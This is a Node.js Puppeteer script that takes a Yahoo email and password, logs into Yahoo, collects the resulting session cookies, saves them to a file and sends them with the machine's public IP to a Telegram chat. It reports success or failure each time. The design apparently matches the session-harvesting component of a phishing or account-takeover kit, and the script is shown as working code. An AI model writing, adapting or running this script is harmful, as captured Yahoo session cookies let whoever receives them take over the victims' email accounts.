const puppeteer = require('puppeteer');
const { sendTelegramMessage, prompt } = require('./utils');
const fs = require('fs');

async function loginYahoo(page, email, password) {
  await page.goto('https://login.yahoo.com/', { waitUntil: 'networkidle2' });

  // Enter email
  await page.type('input[name="username"]', email, { delay: 50 });
  await page.click('#login-signin');
  await page.waitForNavigation({ waitUntil: 'networkidle2' });

  // Enter password
  await page.type('input[name="password"]', password, { delay: 50 });
  await page.click('#login-signin'); // or the actual button selector
  await page.waitForNavigation({ waitUntil: 'networkidle2' });
}

async function main() {
  const email = await prompt('Yahoo Email: ');
  const password = await prompt('Yahoo Password: ');
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  try {
    await loginYahoo(page, email, password);
    const cookies = await page.cookies();
    const cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
    fs.writeFileSync('yahoo_cookies.txt', cookiesStr);

    const ip = await getPublicIP();

    await sendTelegramMessage(`*Yahoo*\nStatus: ✅ Success\nIP: ${ip}\nCookies: ${cookiesStr}`);
  } catch (err) {
    const ip = await getPublicIP();
    await sendTelegramMessage(`*Yahoo*\nFailed: ${err.message}\nIP: ${ip}`);
  }

  await browser.close();
}

async function getPublicIP() {
  const axios = require('axios');
  const res = await axios.get('https://api.ipify.org?format=json');
  return res.data.ip;
}

main();